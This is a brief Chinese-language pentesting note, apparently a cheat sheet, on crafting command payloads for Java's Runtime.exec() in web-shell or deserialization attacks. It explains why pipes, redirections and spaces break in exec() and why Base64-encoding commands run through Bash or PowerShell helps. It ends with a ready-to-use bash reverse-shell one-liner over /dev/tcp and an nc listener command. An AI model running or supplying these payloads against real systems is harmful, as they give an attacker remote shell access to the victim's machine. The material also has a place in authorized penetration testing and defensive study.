# java.lang.Runtime.exec-Payload

### Base64编码shell命令
当使用web shell、反序列化攻击或通过其他向量，通过Runtime.getRuntime().exec()执行命令的有效负载会失败。

这是因为重定向和管道字符的使用方式在正在启动的进程上下文中没有意义。例如，在shell中执行ls>dir_listing应该将当前目录的列表输出到名为dir_listing的文件中。但是在exec()函数的上下文中，该命令将被解释为获取>和dir_listing目录的列表。

有时，包含空格的参数会被StringTokenizer类打断，该类按空格分隔命令字符串。类似ls“My Directory”的内容将被解释为ls“My”“Directory”。

在Base64编码的帮助下，下面的转换器可以帮助减少这些问题。它可以通过调用Bash或PowerShell来创建管道和重定向，还可以确保参数中没有空格。

### 反弹shell命令

反弹shell命令：
	
	bash -i >& /dev/tcp/ip/port 0>&1
	
nc监听端口：

	nc -lvp 777


